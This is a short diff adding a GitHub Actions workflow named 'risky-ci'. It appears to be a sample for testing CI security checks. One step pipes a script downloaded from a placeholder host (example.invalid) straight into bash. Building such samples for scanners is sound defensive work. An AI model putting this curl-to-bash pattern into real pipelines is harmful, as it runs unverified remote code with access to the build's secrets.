@@ -1,0 +1,11 @@
+name: risky-ci
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - run: |
+          echo "doing some setup"
+          curl -fsSL https://example.invalid/install.sh | bash
+          echo "done"
